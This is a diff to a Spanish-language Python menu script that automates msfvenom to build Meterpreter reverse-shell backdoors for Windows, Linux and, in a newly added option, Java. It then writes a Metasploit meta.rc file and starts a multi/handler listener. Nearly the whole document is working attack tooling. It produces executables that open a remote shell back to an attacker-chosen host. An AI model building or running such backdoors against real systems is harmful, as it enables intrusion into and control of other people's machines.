@@ -60,7 +60,8 @@ while True:
         print("3 - Backdoor-Linux con meterpreter (reverse_tcp)")
         print("4 - Backdoor-Linux con meterpreter (reverse_https)")
         print("5 - Backdoor-VPS con meterpreter (reverse_tcp)")
-        print("6 - Salir al menu principal\n")
+        print("6 - Backdoor-Java con meterpreter (reverse tcp)")
+        print("7 - Salir al menu principal\n")
         msfvenom = input("Selecciona una opcion: ")
         if msfvenom == "1":
             os.system("clear")
@@ -69,7 +70,7 @@ while True:
             output = input("Que nombre le quieres dar al archivo?: ")
             os.system('clear')
             print("\nCreando exploit...")
-            os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}".format(lhost, lport, output))
+            os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
             salir = input("Desea abrir el listener de metasploit? (s/n): ")
             f = open("meta.rc", "w+")
             for i in range(1):
@@ -91,7 +92,7 @@ while True:
             output = input("¿Que nombre le quieres dar al archivo?")
             os.system('clear')
             print("\nCreando exploit...")
-            os.system("msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o {}".format(lhost, lport, output))
+            os.system("msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
             salir = input("Desea abrir el listener de metasploit? (s/n): ")
             f = open("meta.rc", "w+")
             for i in range(1):
@@ -113,7 +114,7 @@ while True:
             output = input("Que nombre le quieres dar al archivo?: ")
             os.system('clear')
             print("\nCreando exploit...")
-            os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o {}".format(lhost, lport, output))
+            os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
             salir = input("Desea abrir el listener de metasploit? (s/n): ")
             f = open("meta.rc", "w+")
             for i in range(1):
@@ -135,7 +136,7 @@ while True:
             output = input("Que nombre le quieres dar al archivo?: ")
             os.system('clear')
             print("\nCreando exploit...")
-            os.system("msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o {}".format(lhost, lport, output))
+            os.system("msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
             salir = input("Desea abrir el listener de metasploit? (s/n): ")
             f = open("meta.rc", "w+")
             for i in range(1):
@@ -170,6 +171,29 @@ while True:
                 os.system("msfconsole -r meta.rc")
             else:
                 continue
+        elif msfvenom == "6":
+            os.system("clear")
+            os.system("clear")
+            lhost = input("Escribe la dirección ip o dns: ")
+            lport = int(input("Escribe el puerto: "))
+            output = input("Que nombre le quieres dar al archivo?: ")
+            os.system('clear')
+            print("\nCreando exploit...")
+            os.system("msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o {}.jar".format(lhost, lport, output))
+            salir = input("Desea abrir el listener de metasploit? (s/n): ")
+            f = open("meta.rc", "w+")
+            for i in range(1):
+                f.write("use exploit/multi/handler\n")
+                f.write("set payload java/meterpreter/reverse_tcp\n")
+                f.write("set lhost 0.0.0.0\n")
+                f.write("set lport {}\n".format(lport))
+                f.write("exploit")
+            f.close()
+            if salir == "s":
+                os.system("msfconsole -r meta.rc")
+            else:
+                continue
+
 
     elif opcion == "2":
         os.system('clear')
